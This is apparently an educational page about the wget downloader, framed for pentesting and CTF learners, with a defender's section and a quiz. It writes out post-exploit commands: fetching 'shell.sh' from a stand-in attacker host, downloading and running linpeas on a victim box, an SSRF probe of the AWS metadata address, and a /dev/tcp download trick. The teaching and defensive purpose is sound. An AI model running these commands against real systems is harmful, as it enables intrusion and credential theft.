wget ⬇️

Download files over HTTP/HTTPS from the command line. No browser, no GUI, no excuses.
The command every pentester has muscle-memory for.

"wget http://attacker/shell.sh — 12 bytes later, you own the box." 🐚
Chapter 01 // Definition

📖 What is wget?

wget is a non-interactive network downloader pre-installed on most Linux systems. Give it a URL; it saves the content to disk.

📝 Think of it like a delivery pigeon

You don't go to the store and browse shelves (that's a browser). You write down what you want, tie it to a pigeon, and it flies off, grabs the file, and drops it back at your feet. Fast, scriptable, zero-GUI. Perfect for servers, automation, and — yes — post-exploit payload delivery.

The one-liner

wget https://example.com/file.txt # saves file.txt in your current directory

Useful flags

-O <name>

Save with a different filename. wget URL -O shell.sh

-q

Quiet mode. No progress bar, no stderr noise. Great for scripts.

-c

Continue a partially downloaded file. Resume broken transfers.

--no-check-certificate

Skip TLS cert validation. Handy for self-signed or expired certs on CTF boxes.

the security angle
Chapter 02 // Post-exploit uses

🥷 Why wget is on every pentester's cheat sheet

After you land on a target, you usually need to pull more tools onto the box — privesc scripts, enumeration binaries, reverse shell payloads. wget is the simplest way.

# On your attacker box python3 -m http.server 8000 # On the victim box (shell you just got) wget http://YOUR_IP:8000/linpeas.sh -O /tmp/lp.sh chmod +x /tmp/lp.sh /tmp/lp.sh
💡 The SSRF bonus: wget is also a classic tool for testing SSRF. If a web app gives you URL-fetching, feed it http://169.254.169.254/latest/meta-data/ (AWS metadata) and see what comes back.

Alternatives when wget isn't there

🌀 curl -O URL

The other mega-common HTTP client. Usually installed alongside wget.

🐍 Python one-liner

python3 -c "import urllib.request;urllib.request.urlretrieve('URL','out')"

🔌 Bash's /dev/tcp

Minimal boxes sometimes lack both. Craft HTTP over raw TCP via exec 3<>/dev/tcp/host/80.

Chapter 03 // Defender's angle

🛡️ Spot wget abuse on YOUR server

If your web server shouldn't be making outbound HTTP requests, but logs show wget firing off to random IPs — that's probably an attacker pulling in tooling. Defensive moves:

  • Egress filtering — block outbound HTTP from production servers by default.
  • Monitor auditd or execve events for wget/curl invocations by service users.
  • Remove wget from containers and minimal images.

🎯 Quick Check

You need to download enum.sh from your server at 10.10.1.5:8080 onto the target, saving it as /tmp/e.sh. Which command?
wget 10.10.1.5:8080/enum.sh /tmp/e.sh
wget http://10.10.1.5:8080/enum.sh -O /tmp/e.sh
wget --save /tmp/e.sh 10.10.1.5:8080/enum.sh
wget /tmp/e.sh < http://10.10.1.5:8080/enum.sh
